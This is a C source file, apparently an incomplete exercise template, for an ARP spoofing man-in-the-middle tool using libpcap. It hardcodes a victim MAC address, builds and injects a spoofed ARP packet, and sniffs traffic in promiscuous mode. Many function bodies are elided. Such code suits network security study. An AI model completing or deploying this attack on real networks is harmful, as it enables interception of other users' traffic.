#include <pcap.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h> 
#include <netinet/ip.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <net/if.h>

pcap_t* descr;

struct sockaddr_in victim, gateway; 
unsigned char *broadcast_mac;
unsigned char *attacker_mac;
unsigned char victim_mac[6] = {0x08,0x00,0x27,0x68,0x4a,0xbd};
unsigned char gateway_mac[6];
......
char *arp_request;
int arp_request_size;


void my_callback(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char *packet)
{
    struct ethhdr *ineth;
    struct ether_arp *inarp;

    ineth = (struct ethhdr *) &packet[0];
    
    // check if its an ARP packet
    if (ntohs(ineth->h_proto)==0x0806)
    {
	......
	}else if (memcmp(ineth->h_dest, attacker_mac, ETH_ALEN)==0)
	{
	   ......
	}
    else
    {
	// not ARP packet
	// help to forward to gateway if the packet is from victim, and destination is attacker_mac
	// note that before victim sends us any ARP, we will not help victim to forward since victim_mac is not initialize yet
    }
}

// return the size of the arp packet
int generateARPReply(char *packet, unsigned char *hsource, unsigned char *hdest, u_int8_t *spa, u_int8_t *tpa)
{
    struct ethhdr *ineth;      	// Ethernet header
    struct ether_arp *inarp;       // ARP header
    int size;

    ......
    
    return size;
}

// return the size of the arp packet
int generateARPRequest(char *packet)
{
    struct ethhdr *ineth;      	// Ethernet header
    struct ether_arp *inarp;       // ARP header
    int size;

    ......    
    return size;
}

int main(int argc,char **argv)
{ 
    char *dev; 
    char errbuf[PCAP_ERRBUF_SIZE];    
    struct bpf_program fp;      /* hold compiled program     */
    bpf_u_int32 maskp;          /* subnet mask               */
    bpf_u_int32 netp;           /* ip                        */

    u_char filter[512];
    ......
    
    // initialize constants
    dev = "eth0";
    
    ......
    
    // generate arp spoofing request packet
    arp_request = (char *) malloc(BUFSIZ);
    arp_request_size = generateARPRequest(arp_request);
    
    /* ask pcap for the network address and mask of the device */
    pcap_lookupnet(dev,&netp,&maskp,errbuf);
    struct in_addr inaddr;
    
    /* open device for reading and set it to promiscuous mode */    
    descr = pcap_open_live(dev,BUFSIZ,1,-1,errbuf);
    if(descr == NULL)
    { printf("pcap_open_live(): %s\n",errbuf); exit(1); }

    //strcpy((char*)filter,"ether proto 0x0806");
    strcpy((char*)filter,"");
    printf("filter: %s\n", filter);

    /* Compile the program...optimized */
    if(pcap_compile(descr,&fp, (const char*)filter,1,netp) == -1)
    { fprintf(stderr,"Error calling pcap_compile\n"); exit(1); }

    /* set the compiled program as the filter */
    if(pcap_setfilter(descr,&fp) == -1)
    { fprintf(stderr,"Error setting filter\n"); exit(1); }
    ......

    inaddr.s_addr = (unsigned long) netp;
    printf("net address: %s\n", inet_ntoa(inaddr));
    
    inaddr.s_addr = (unsigned long) maskp;
    printf("net mask: %s\n", inet_ntoa(inaddr));
    
    // Send the spoofed ARP packet
    pcap_inject(descr, arp_request, arp_request_size);

    /* ... and loop */ 
    pcap_loop(descr,-1,my_callback,(u_char *)"");
    return 0;
}
